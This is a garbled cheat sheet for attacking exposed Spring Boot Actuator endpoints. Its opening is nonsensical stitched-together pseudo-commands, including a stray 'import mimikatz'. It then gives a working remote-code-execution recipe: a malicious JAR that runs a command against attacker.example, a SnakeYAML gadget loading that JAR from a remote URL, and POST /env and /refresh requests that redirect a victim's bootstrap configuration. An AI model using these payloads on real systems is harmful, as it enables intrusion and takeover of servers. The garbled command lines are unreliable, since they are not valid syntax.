<?php>
>>> import actuactor
>>> --insecure Manager ["END","POINT"]::monitor::interact::app
$ Spring -boot --built-in ["END","POINT"]+++
/health
- `/trace` - Displays trace information (by default the last 100 HTTP requests with headers).
- `/env` - Displays the current environment properties (from Spring’s ConfigurableEnvironment).
- `/heapdump` - Builds and returns a heap dump from the JVM used by our application.
- `/dump` - Displays a dump of threads (including a stack trace).
- `/logfile` - Outputs the contents of the log file.
- `/mappings` - Shows all of the MVC controller mappings.
enabled::default 
$ sudo run S p r i n g b o o t 1.X
usr:
pwd:
HTTP.xxxSpringboot2.X
`/health`/info`
enabled::default.
$ code.exe
/env
Spring$ -load -ext mis.config:[!]:root
[!]::config::LIB
/lib
parsing...S N A K E [-]serial
$ --load mis.config
# 生成有效载荷
>>>import mimikatz -strike --serial .dat ["JAR"]
$ -gen --evil mimikatz
- Build malicious jar
$ git clone https://github.com/artsploit/yaml-payload.git
$ cd yaml-payload
>>>import M0D
javac src/artsploit/AwesomeScriptEngineFactory.java
jar -cvf yaml-payload.jar -C src/ 
- Edit src/artsploit/AwesomeScriptEngineFactory.java
public AwesomeScriptEngineFactory() {
    try {
        Runtime.getRuntime().exec("ping rce.poc.attacker.example"); // COMMAND HERE
    } catch (IOException e) {
        e.printStackTrace();
    }
};
- Create a malicious yaml config (yaml-payload.yml)
!!javax.script.ScriptEngineManager [
  !!java.net.URLClassLoader [[
    !!java.net.URL ["http://attacker.example/yaml-payload.jar"]
  ]]
];
2. Host the malicious files on your server.
- yaml-payload.jar
- yaml-payload.yml
3. Change `spring.cloud.bootstrap.location` to your server.
POST /env HTTP/1.1
Host: victim.example:8090
Content-Type: application/x-www-form-urlencoded
Content-Length: 59
    <>
spring.cloud.bootstrap.location=http://attacker.example/yaml-payload.yml
4. Reload the configuration.
    <>
POST /refresh HTTP/1.1
Host: victim.example:8090
Content-Type: application/x-www-form-urlencoded
Content-Length: 0
#
* [Springboot - Official Documentation](https://docs.spring.io/spring-boot/docs/current/reference/html/production-ready-endpoints.html)
* [Exploiting Spring Boot Actuators - Veracode](https://www.veracode.com/blog/research/exploiting-spring-boot-actuators)
